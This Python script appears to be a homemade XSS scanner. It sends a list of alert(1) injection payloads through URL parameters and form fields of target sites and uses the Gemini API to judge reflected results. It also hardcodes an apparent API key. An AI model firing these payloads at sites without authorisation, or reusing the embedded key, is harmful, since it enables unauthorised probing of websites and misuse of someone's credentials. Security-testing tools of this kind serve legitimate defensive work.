import os
import requests
import urllib.parse
import json
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor

# Gemini API configuration
GEMINI_API_KEY = "AIzaSyBRD2TjLNSV5LnTfD38DIy5CWjQy4SGJ_M"
GEMINI_API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"

# XSS payloads to test
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '\'"<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '"><svg/onload=alert(1)>',
    '"onmouseover="alert(1)',
    '"autofocus onfocus=alert(1)//',
    'Hacked"<script>alert(1)</script>',
]

# Headers for HTTP requests
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
}

def generate_random_string(length=8):
    """Generate a random string for testing reflection."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def extract_urls_with_params(file_path):
    """Extract URLs with parameters from a file."""
    urls = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                url = line.strip()
                if url and '?' in url:  # تأكد من أن URL ليس فارغًا ويحتوي على بارامترز
                    urls.append(url)
    except Exception as e:
        print(f"Error reading file: {e}")
    
    print(f"Found {len(urls)} URLs with parameters to test.")
    return urls

def test_url_for_xss(url):
    """Test a URL for XSS vulnerabilities using Gemini for analysis."""
    print(f"Testing URL: {url}")
    results = []
    
    try:
        # Parse the URL to get parameters
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # If no parameters in URL, try to find form fields
        if not query_params:
            try:
                print(f"No query parameters found, checking for forms in {url}")
                response = requests.get(url, headers=HEADERS, timeout=10)
                
                # Simple form field extraction
                form_fields = []
                if '<form' in response.text.lower():
                    # Extract input fields from forms
                    input_pattern = r'<input.*?name=["\']([^"\']+)["\']'
                    form_fields = re.findall(input_pattern, response.text, re.IGNORECASE)
                    
                    if form_fields:
                        print(f"Found {len(form_fields)} form fields: {', '.join(form_fields)}")
                        
                        # Test each form field with a random value
                        for field in form_fields:
                            random_value = generate_random_string()
                            
                            # Try a POST request with the field
                            test_data = {field: random_value}
                            try:
                                post_response = requests.post(url, data=test_data, headers=HEADERS, timeout=10)
                                
                                # Check if the random value is reflected
                                if random_value in post_response.text:
                                    print(f"Field {field} reflects input, testing XSS payloads")
                                    
                                    # Test XSS payloads
                                    for payload in XSS_PAYLOADS:
                                        xss_data = {field: payload}
                                        xss_response = requests.post(url, data=xss_data, headers=HEADERS, timeout=10)
                                        
                                        if payload in xss_response.text:
                                            is_vulnerable, explanation = analyze_with_gemini(url, payload, xss_response.text)
                                            
                                            if is_vulnerable:
                                                results.append({
                                                    'url': url,
                                                    'param': f"form:{field}",
                                                    'payload': payload,
                                                    'status': 'Potential XSS Vulnerability (Form)',
                                                    'analysis': explanation
                                                })
                                                break
                            except Exception as e:
                                print(f"Error testing form field {field}: {e}")
                                continue
            except Exception as e:
                print(f"Error checking for forms: {e}")
            
            return results
        
        # Test each parameter individually for better results
        for param, values in query_params.items():
            print(f"Testing parameter: {param}")
            random_value = generate_random_string()
            
            # Create a test URL with just this parameter
            test_params = {p: values[0] for p, values in query_params.items()}
            test_params[param] = random_value
            test_url = f"{base_url}?{urllib.parse.urlencode(test_params, doseq=True)}"
            
            try:
                test_response = requests.get(test_url, headers=HEADERS, timeout=10)
                
                # Check if the random value is reflected
                if random_value in test_response.text:
                    print(f"Parameter {param} reflects input, testing XSS payloads")
                    
                    # Test XSS payloads
                    for payload in XSS_PAYLOADS:
                        xss_params = {p: values[0] for p, values in query_params.items()}
                        xss_params[param] = payload
                        xss_url = f"{base_url}?{urllib.parse.urlencode(xss_params, doseq=True)}"
                        
                        try:
                            xss_response = requests.get(xss_url, headers=HEADERS, timeout=10)
                            xss_content = xss_response.text
                            
                            # Simplified check - if payload is in response, consider it potentially vulnerable
                            if payload in xss_content:
                                print(f"Potential XSS found in parameter {param} with payload {payload}")
                                results.append({
                                    'url': url,
                                    'param': param,
                                    'payload': payload,
                                    'status': 'Potential XSS Vulnerability',
                                    'analysis': "Payload was reflected in the response without proper encoding"
                                })
                                break
                        except Exception as e:
                            print(f"Error testing XSS payload: {e}")
                else:
                    print(f"Parameter {param} does not reflect input")
            except Exception as e:
                print(f"Error testing parameter {param}: {e}")
        
    except Exception as e:
        print(f"Error processing URL {url}: {e}")
    
    return results

def analyze_with_gemini(url, payload, response_content):
    """
    Use Gemini API to analyze if the XSS payload is likely to be executed.
    """
    # Simplified analysis - if the payload is in the response, it's potentially vulnerable
    if payload in response_content:
        # Check if it's in a script tag or event handler
        if f'<script>{payload}' in response_content or f'onerror={payload}' in response_content:
            return True, "VULNERABLE: Payload appears in executable context (script tag or event handler)"
        # Check if it's not properly encoded
        elif '&lt;script&gt;' not in response_content and '&quot;' not in response_content:
            return True, "VULNERABLE: Payload appears unencoded in the response"
    
    # If we still want to use Gemini for more advanced analysis
    prompt = f"""
    I need to analyze if this XSS payload is likely to be executed in the following HTML response.
    
    URL: {url}
    Payload: {payload}
    
    HTML Response (truncated if necessary):
    {response_content[:4000]}
    
    Please analyze if:
    1. The payload appears unencoded in the HTML
    2. The payload is within a context where it could be executed (not in comments, not properly escaped)
    3. There are any signs of XSS protection or encoding that would prevent execution
    
    Respond with only "VULNERABLE" or "NOT VULNERABLE" followed by a brief explanation.
    """
    
    api_url = f"{GEMINI_API_URL}?key={GEMINI_API_KEY}"
    
    data = {
        "contents": [
            {
                "parts": [
                    {"text": prompt}
                ]
            }
        ],
        "generationConfig": {
            "temperature": 0.1,
            "maxOutputTokens": 200
        }
    }
    
    try:
        response = requests.post(api_url, json=data)
        if response.status_code == 200:
            result = response.json()
            if "candidates" in result and len(result["candidates"]) > 0:
                text = result["candidates"][0]["content"]["parts"][0]["text"]
                is_vulnerable = text.strip().startswith("VULNERABLE")
                explanation = text.strip()
                return is_vulnerable, explanation
        return False, "Error analyzing response with Gemini"
    except Exception as e:
        return False, f"Error calling Gemini API: {str(e)}"

def scan_xss(params_file_path, max_workers=3):
    """
    Scan URLs with parameters for XSS vulnerabilities using Gemini for analysis.
    
    Args:
        params_file_path: Path to the file containing URLs with parameters
        max_workers: Maximum number of concurrent workers
    
    Returns:
        List of potential XSS vulnerabilities
    """
    if not os.path.exists(params_file_path):
        print(f"File not found: {params_file_path}")
        return []
    
    urls = extract_urls_with_params(params_file_path)
    if not urls:
        print("No URLs with parameters found in the file.")
        return []
    
    print(f"Found {len(urls)} URLs with parameters to test.")
    
    # Process URLs in smaller batches to show progress
    batch_size = 5
    all_results = []
    
    for i in range(0, len(urls), batch_size):
        batch = urls[i:i+batch_size]
        print(f"\nProcessing batch {i//batch_size + 1}/{(len(urls) + batch_size - 1)//batch_size}...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(test_url_for_xss, batch))
            
            for result in results:
                all_results.extend(result)
                
        # Show intermediate results
        if all_results:
            print(f"Found {len(all_results)} potential vulnerabilities so far")
    
    # Save results to file
    output_dir = os.path.dirname(params_file_path)
    domain = os.path.basename(params_file_path).split('_')[0]
    output_file = os.path.join(output_dir, f"{domain}_xss_results.txt")
    
    with open(output_file, 'w') as f:
        if all_results:
            f.write("XSS Vulnerability Scan Results (Gemini Analysis)\n")
            f.write("===========================================\n\n")
            
            for result in all_results:
                f.write(f"URL: {result['url']}\n")
                f.write(f"Parameter: {result['param']}\n")
                f.write(f"Payload: {result['payload']}\n")
                f.write(f"Status: {result['status']}\n")
                f.write(f"Analysis: {result['analysis']}\n")
                f.write("-----------------------------\n\n")
        else:
            f.write("No XSS vulnerabilities found.\n")
    
    return all_results

def test_specific_parameter(param_name, target_url=None):
    """Test a specific parameter for XSS vulnerabilities."""
    if not target_url:
        target_url = "http://testphp.vulnweb.com/search.php"
    
    url = f"{target_url}?{param_name}=test"
    print(f"Testing parameter '{param_name}' on URL: {url}")
    
    results = []
    random_value = generate_random_string()
    
    try:
        # Test for reflection
        reflection_url = f"{target_url}?{param_name}={random_value}"
        reflection_response = requests.get(reflection_url, headers=HEADERS, timeout=10)
        
        if random_value in reflection_response.text:
            print(f"Parameter '{param_name}' reflects input, testing XSS payloads")
            
            # Test XSS payloads
            for payload in XSS_PAYLOADS:
                xss_url = f"{target_url}?{param_name}={urllib.parse.quote(payload)}"
                
                try:
                    xss_response = requests.get(xss_url, headers=HEADERS, timeout=10)
                    
                    if payload in xss_response.text:
                        is_vulnerable, explanation = analyze_with_gemini(xss_url, payload, xss_response.text)
                        
                        if is_vulnerable:
                            results.append({
                                'url': target_url,
                                'param': param_name,
                                'payload': payload,
                                'status': 'Potential XSS Vulnerability',
                                'analysis': explanation
                            })
                            break
                except Exception as e:
                    print(f"Error testing XSS payload: {e}")
        else:
            print(f"Parameter '{param_name}' does not reflect input")
    
    except Exception as e:
        print(f"Error testing parameter: {e}")
    
    return results

if __name__ == "__main__":
    # For testing the script directly
    import sys
    import re  # Add this import at the top of the file
    
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
        
        # Check if it's a direct parameter test
        if '=' in file_path and not os.path.exists(file_path):
            param_name = file_path.split('=')[0]
            target_url = None
            if len(sys.argv) > 2:
                target_url = sys.argv[2]
            
            results = test_specific_parameter(param_name, target_url)
            
            if results:
                print(f"\nFound {len(results)} potential XSS vulnerabilities!")
                for result in results:
                    print(f"\nURL: {result['url']}")
                    print(f"Parameter: {result['param']}")
                    print(f"Payload: {result['payload']}")
                    print(f"Status: {result['status']}")
                    print(f"Analysis: {result['analysis']}")
            else:
                print("\nNo XSS vulnerabilities found.")
        else:
            print(f"Scanning file: {file_path}")
            results = scan_xss(file_path)
            
            if results:
                print(f"\nFound {len(results)} potential XSS vulnerabilities!")
                for result in results:
                    print(f"\nURL: {result['url']}")
                    print(f"Parameter: {result['param']}")
                    print(f"Payload: {result['payload']}")
                    print(f"Status: {result['status']}")
                    print(f"Analysis: {result['analysis']}")
            else:
                print("\nNo XSS vulnerabilities found.")
    else:
        print("Usage: python xss_test.py <path_to_params_file_or_parameter>")
        print("Examples:")
        print("  python xss_test.py C:\\Users\\begad\\OneDrive\\Desktop\\Recon-test\\crawler\\example.com_params.txt")
        print("  python xss_test.py search=test http://testphp.vulnweb.com/search.php")